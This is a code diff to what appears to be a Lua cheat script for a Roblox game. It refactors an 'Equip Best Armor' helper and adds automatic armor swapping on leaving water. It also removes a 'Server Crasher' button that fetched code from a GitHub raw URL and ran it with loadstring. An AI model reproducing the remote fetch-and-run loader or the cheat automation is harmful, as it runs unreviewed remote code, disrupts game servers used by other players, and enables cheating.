@@ -1006,55 +1006,61 @@ AutoArmorDeluxeGroup:AddCheckbox("ArmorCraftOnly", {
 	Default = false,
 })
 
-AutoArmorDeluxeGroup:AddButton({
-	Text = "Equip Best Armor",
-	Func = function()
-		local equipClothingRemote = TSG.EquipClothingRemote
-		if not equipClothingRemote then
-			Library:Notify({ Title = "Error", Description = "Equip remotes not found", Time = 3 })
-			return
-		end
-		if not TSG.ClientData or not TSG.Items then
-			Library:Notify({ Title = "Error", Description = "Item data not loaded", Time = 3 })
-			return
-		end
+-- Shared helper: equips the highest-defense Helmet / Shirt / Pants in the
+-- player's inventory. Used by the button below and by Atlantean Auto Swap.
+function equipBestArmor()
+	local equipClothingRemote = TSG.EquipClothingRemote
+	if not equipClothingRemote then
+		Library:Notify({ Title = "Error", Description = "Equip remotes not found", Time = 3 })
+		return
+	end
+	if not TSG.ClientData or not TSG.Items then
+		Library:Notify({ Title = "Error", Description = "Item data not loaded", Time = 3 })
+		return
+	end
 
-		local best = {}
-		for itemId in pairs(TSG.ClientData.getInventory()) do
-			local data = TSG.Items.getItemData(itemId)
-			local stats = data and data.itemStats
-			if stats and stats.defense then
-				local kind = data.itemType and data.itemType[1]
-				if kind == "Helmet" or kind == "Shirt" or kind == "Pants" then
-					local current = best[kind]
-					if not current or stats.defense > current.def then
-						best[kind] = {
-							id = itemId,
-							def = stats.defense,
-							name = TSG.Items.getItemNameById(itemId) or tostring(itemId),
-						}
-					end
+	local best = {}
+	for itemId in pairs(TSG.ClientData.getInventory()) do
+		local data = TSG.Items.getItemData(itemId)
+		local stats = data and data.itemStats
+		if stats and stats.defense then
+			local kind = data.itemType and data.itemType[1]
+			if kind == "Helmet" or kind == "Shirt" or kind == "Pants" then
+				local current = best[kind]
+				if not current or stats.defense > current.def then
+					best[kind] = {
+						id = itemId,
+						def = stats.defense,
+						name = TSG.Items.getItemNameById(itemId) or tostring(itemId),
+					}
 				end
 			end
 		end
+	end
 
-		local clothingSlots = { Helmet = 1, Shirt = 2, Pants = 3 }
-		local equipped = {}
-		for kind, slot in pairs(clothingSlots) do
-			local pick = best[kind]
-			if pick then
-				pcall(function()
-					equipClothingRemote:InvokeServer("inventory", slot, pick.id)
-				end)
-				table.insert(equipped, pick.name)
-			end
+	local clothingSlots = { Helmet = 1, Shirt = 2, Pants = 3 }
+	local equipped = {}
+	for kind, slot in pairs(clothingSlots) do
+		local pick = best[kind]
+		if pick then
+			pcall(function()
+				equipClothingRemote:InvokeServer("inventory", slot, pick.id)
+			end)
+			table.insert(equipped, pick.name)
 		end
+	end
 
-		if #equipped > 0 then
-			Library:Notify({ Title = "Best Armor", Description = table.concat(equipped, ", "), Time = 3 })
-		else
-			Library:Notify({ Title = "Best Armor", Description = "No armor found in inventory", Time = 3 })
-		end
+	if #equipped > 0 then
+		Library:Notify({ Title = "Best Armor", Description = table.concat(equipped, ", "), Time = 3 })
+	else
+		Library:Notify({ Title = "Best Armor", Description = "No armor found in inventory", Time = 3 })
+	end
+end
+
+AutoArmorDeluxeGroup:AddButton({
+	Text = "Equip Best Armor",
+	Func = function()
+		equipBestArmor()
 	end,
 })
 
@@ -1123,6 +1129,9 @@ Toggles.AtlanteanAutoSwap:OnChanged(function()
 			local inWater = hum:GetState() == Enum.HumanoidStateType.Swimming or char:GetAttribute("inWater")
 			if inWater and not wasInWater then
 				equipAtlantean()
+			elseif wasInWater and not inWater then
+				-- Got out of the water: swap straight back to the best armor.
+				equipBestArmor()
 			end
 			wasInWater = inWater
 		end))
@@ -3865,20 +3874,6 @@ MainRight:AddButton({
 	Text = "Switch Server",
 	Func = function()
 		task.spawn(joinLowPingServer)
-	end,
-})
-
-MainRight:AddButton({
-	Text = "Server Crasher",
-	Func = function()
-		local ok, err = pcall(function()
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/sobachgroi67-cpu/idkgscripts/refs/heads/main/gscripts"))()
-		end)
-		if not ok then
-			Library:Notify({ Title = "Server Crasher", Description = "Failed: " .. tostring(err), Time = 3 })
-			return
-		end
-		Library:Notify({ Title = "Server Crasher", Description = "Loaded", Time = 2 })
 	end,
 })
 
